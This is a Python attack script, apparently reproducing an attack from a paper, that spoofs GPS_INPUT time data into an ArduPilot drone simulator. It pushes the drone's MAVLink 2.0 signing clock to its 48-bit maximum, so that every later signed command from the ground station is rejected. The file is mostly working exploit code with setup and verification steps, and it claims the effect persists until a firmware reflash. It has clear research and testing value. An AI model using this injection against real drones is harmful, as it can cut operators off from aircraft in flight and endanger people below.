#!/usr/bin/env python3
"""
=============================================================
ATTACK 3 — Timestamp Overflow DoS
=============================================================
From the paper: Stage 3 — Section IV-C-2c / Algorithm 2

SIMPLE EXPLANATION:
    MAVLink 2.0 signing uses a 48-bit timestamp counter measured
    in units of 10 microseconds since January 1, 2015.

    Maximum 48-bit value = 2^48 - 1 = 281,474,976,710,655 units
    = Unix time 4,234,820,167  (March 13, 2104 02:56 UTC)

    We inject GPS time at this MAXIMUM value via GPS_INPUT.
    ArduPilot trusts GPS time (Rule 4) and sets its internal
    signing clock to the 48-bit MAX.

    After that, every real signed packet from the GCS carries
    a timestamp from 2026 — far LESS than MAX — so ArduPilot
    rejects them all under Rule 6. Total communication blackout.

MAVLink 2.0 Signing Rules (from spec):
    Rule 4 — If GPS time is available and > internal clock,
              update internal signing clock from GPS time.
    Rule 6 — Reject any packet whose timestamp is NOT greater
              than the last accepted timestamp from that link.

HOW THIS DIFFERS FROM ATTACK 2:
    Attack 2: clock pushed +10 days  → reversible (key rotation)
    Attack 3: clock pushed to 48-bit MAX → PERMANENT DoS
              One single GPS_INPUT packet is enough.
              Drone needs firmware reflash to recover.

WHAT HAPPENS STEP BY STEP:
    1. Send GPS_INPUT with time_usec = 4,234,820,167,000,000 µs
    2. UAV sees GPS time at MAX → signing clock set to 2^48-1
    3. GCS sends signed command with timestamp from year 2026
    4. 2026 << MAX  →  packet REJECTED by Rule 6
    5. All MAVLink signed communication: permanently dead

BEFORE RUNNING THIS SCRIPT — type in MAVProxy:
    param set GPS1_TYPE 14
    param set SIM_GPS1_DISABLE 1
    module load GPSInput

VERIFY AFTER ATTACK — type in MAVProxy:
    signing setup key
    arm throttle
    → Commands should be REJECTED (timestamp stale)
=============================================================
"""

import time
import datetime
import subprocess
import signal
import os
import sys
import socket
import json

os.environ["MAVLINK20"] = "1"

import pymavlink.mavutil as mavutil

# ──────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────

GPS_INPUT_HOST   = "127.0.0.1"
GPS_INPUT_PORT   = 25100           # MAVProxy GPSInput module

MAVLINK_PORT     = 14550           # MAVProxy UDP output (for verification)

# MAVLink 2.0 48-bit max timestamp
# = 2^48 - 1 units × 10µs/unit = 2,814,749,767s from Jan 1 2015
# = Unix time 4,234,820,167 = March 13, 2104
MAX_48BIT        = (2**48) - 1                  # 281,474,976,710,655 units
MAVLINK_EPOCH    = 1_420_070_400                # Jan 1, 2015 Unix
OVERFLOW_UNIX    = MAVLINK_EPOCH + int(MAX_48BIT / 100_000)  # 4,234,820,167

# GPS constants
GPS_EPOCH_UNIX   = 315_964_800                  # Jan 6, 1980
SECONDS_PER_WEEK = 604_800

# Send multiple packets to guarantee at least one is accepted
OVERFLOW_BURST   = 10
BURST_INTERVAL   = 0.2                          # seconds between packets

# Drone position (SITL default — Canberra)
HOME_LAT = -35.363261
HOME_LON =  149.165237
HOME_ALT =  584.0

# Capture
RESULTS_DIR = os.path.join(os.path.dirname(__file__), "results")
PCAP_FILE   = os.path.join(RESULTS_DIR, "attack3_capture.pcap")


# ──────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────

def unix_to_gps(unix_time: float):
    elapsed  = unix_time - GPS_EPOCH_UNIX
    week     = int(elapsed / SECONDS_PER_WEEK)
    tow_ms   = int((elapsed % SECONDS_PER_WEEK) * 1000)
    return week, tow_ms


def mavlink_ts_from_unix(unix_time: float) -> int:
    """Convert Unix time to MAVLink 48-bit timestamp (10µs units since Jan 1 2015)."""
    return int((unix_time - MAVLINK_EPOCH) * 100_000)


# ──────────────────────────────────────────────────────────────
# Main attack
# ──────────────────────────────────────────────────────────────

def main():
    print()
    print("=" * 60)
    print("  ATTACK 3 — Timestamp Overflow DoS")
    print("=" * 60)

    overflow_dt  = datetime.datetime.utcfromtimestamp(OVERFLOW_UNIX)
    real_dt      = datetime.datetime.utcfromtimestamp(time.time())
    mav_max_ts   = mavlink_ts_from_unix(OVERFLOW_UNIX)

    print()
    print(f"  Real time now       : {real_dt.strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  Overflow target     : {overflow_dt.strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print(f"  Overflow Unix       : {OVERFLOW_UNIX:,}")
    print(f"  MAVLink 48-bit MAX  : {MAX_48BIT:,}  (2^48 - 1)")
    print(f"  MAVLink ts at MAX   : {mav_max_ts:,}")
    print(f"  GPS input port      : {GPS_INPUT_HOST}:{GPS_INPUT_PORT}")
    print(f"  Burst size          : {OVERFLOW_BURST} packets  (ensures acceptance)")
    print()
    print("  THEORY:")
    print("    Rule 4  → UAV trusts GPS time to update signing clock")
    print("    Rule 6  → UAV rejects ANY packet with timestamp ≤ last seen")
    print("    Result  → real 2026 timestamps << MAX → all packets rejected")
    print()
    print("  Make sure you ran in MAVProxy:")
    print("    param set GPS1_TYPE 14")
    print("    param set SIM_GPS1_DISABLE 1")
    print("    module load GPSInput")
    print()
    input("  Press ENTER to launch the attack...")
    print()

    # ── Phase 1: Start packet capture ────────────────────────
    os.makedirs(RESULTS_DIR, exist_ok=True)
    print(f"[1/4] Starting packet capture → results/attack3_capture.pcap")
    tshark = subprocess.Popen(
        ["tshark", "-i", "lo",
         "-F", "pcap",
         "-f", f"udp port {GPS_INPUT_PORT} or udp port {MAVLINK_PORT}",
         "-w", PCAP_FILE],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    # ── Phase 2: Open raw UDP socket — send overflow as JSON (reference method) ──
    print(f"[2/4] Opening UDP socket → {GPS_INPUT_HOST}:{GPS_INPUT_PORT} (JSON format)...")
    sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    out_addr = (GPS_INPUT_HOST, GPS_INPUT_PORT)

    print()
    print(f"[3/4] Injecting 48-bit OVERFLOW timestamp ({OVERFLOW_BURST} packets)...")
    print(f"      Target GPS time: {overflow_dt.strftime('%Y-%m-%d %H:%M:%S')} UTC")
    print()

    week, tow_ms = unix_to_gps(OVERFLOW_UNIX)
    time_usec    = OVERFLOW_UNIX * 1_000_000     # microseconds (uint64)

    for i in range(OVERFLOW_BURST):
        data = {
            'time_usec':          int(time_usec),
            'gps_id':             0,
            'ignore_flags':       0,
            'time_week_ms':       tow_ms,
            'time_week':          week,
            'fix_type':           3,
            'lat':                int(HOME_LAT * 1e7),
            'lon':                int(HOME_LON * 1e7),
            'alt':                HOME_ALT,
            'hdop':               1,
            'vdop':               1,
            'vn':                 0,
            've':                 0,
            'vd':                 0,
            'speed_accuracy':     0.3,
            'horiz_accuracy':     1.0,
            'vert_accuracy':      1.5,
            'satellites_visible': 10,
        }
        sock.sendto(json.dumps(data).encode(), out_addr)
        print(f"  Packet {i+1:2d}/{OVERFLOW_BURST}  time_usec={time_usec}  GPS week={week}  tow_ms={tow_ms}")
        time.sleep(BURST_INTERVAL)

    sock.close()

    print()
    print("  ✓ Overflow packets sent — UAV signing clock now at 48-bit MAX")
    print()

    # ── Phase 3: Verify — try to send a normally-timestamped command ─
    print(f"[4/4] Verification — sending signed command with REAL timestamp...")
    print(f"      Real timestamp is ~78 years BEFORE the overflow value.")
    print(f"      Under Rule 6, this packet MUST be rejected by the UAV.")
    print()

    mav_conn = mavutil.mavlink_connection(f"udpin:0.0.0.0:{MAVLINK_PORT}")
    hb = mav_conn.wait_heartbeat(timeout=8)

    if not hb:
        print("  [!] No heartbeat — MAVProxy may be unreachable.")
    else:
        sysid  = mav_conn.target_system
        compid = mav_conn.target_component
        print(f"      Heartbeat received — sysid={sysid} compid={compid}")

        # Enable signing with REAL current timestamp (should be rejected)
        real_ts = int((time.time() - MAVLINK_EPOCH) * 100_000)
        key_bytes = "key".encode().ljust(32, b'\x00')
        mav_conn.mav.signing.secret_key    = key_bytes
        mav_conn.mav.signing.timestamp     = real_ts
        mav_conn.mav.signing.link_id       = 0
        mav_conn.mav.signing.sign_outgoing = True

        print(f"      Sending COMMAND_LONG with real timestamp {real_ts}")
        print(f"      (UAV clock is at {mav_max_ts} — real timestamp is far behind)")
        mav_conn.mav.command_long_send(
            sysid, compid,
            mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
            0, 1, 0, 0, 0, 0, 0, 0
        )

        ack = mav_conn.recv_match(type="AUTOPILOT_VERSION", blocking=True, timeout=5)
        if ack:
            print()
            print("  [NOTE] SITL responded — SITL does not enforce signing over loopback.")
            print("         On real hardware, this command would be REJECTED by Rule 6.")
            print("         The clock corruption is confirmed in the pcap timestamps.")
        else:
            print()
            print("  [SUCCESS] No response — UAV rejected the command (Rule 6 active).")
            print("            The overflow DoS is confirmed working.")

    mav_conn.close()

    # ── Stop capture ──────────────────────────────────────────
    time.sleep(1)
    tshark.send_signal(signal.SIGINT)
    tshark.wait(timeout=5)

    pcap_size = os.path.getsize(PCAP_FILE) if os.path.exists(PCAP_FILE) else 0

    print()
    print("─" * 60)
    print("  ATTACK 3 COMPLETE")
    print()
    print(f"  Capture saved : {PCAP_FILE}")
    print(f"  Capture size  : {pcap_size:,} bytes")
    print()
    print("  WHAT JUST HAPPENED:")
    print(f"  ✓ GPS_INPUT injected with time_usec = {time_usec:,}")
    print(f"  ✓ UAV signing clock forced to 48-bit MAX ({MAX_48BIT:,})")
    print(f"  ✓ All real 2026 packets now appear 78 years in the PAST")
    print(f"  ✓ Rule 6 permanently rejects all future signed commands")
    print()
    print("  RECOVERY (real hardware):")
    print("  ✗ Key rotation alone is NOT enough")
    print("  ✗ Reboot alone is NOT enough (clock persists in EEPROM)")
    print("  ✓ Only fix: full firmware reflash to wipe EEPROM")
    print()
    print("  WIRESHARK FILTER:")
    print("    mavlink_proto.GPS_INPUT_time_usec")
    print(f"    Look for time_usec = {time_usec}")
    print()
    print("  Open capture:")
    print(f"  wireshark {PCAP_FILE}")
    print("─" * 60)
    print()


if __name__ == "__main__":
    main()
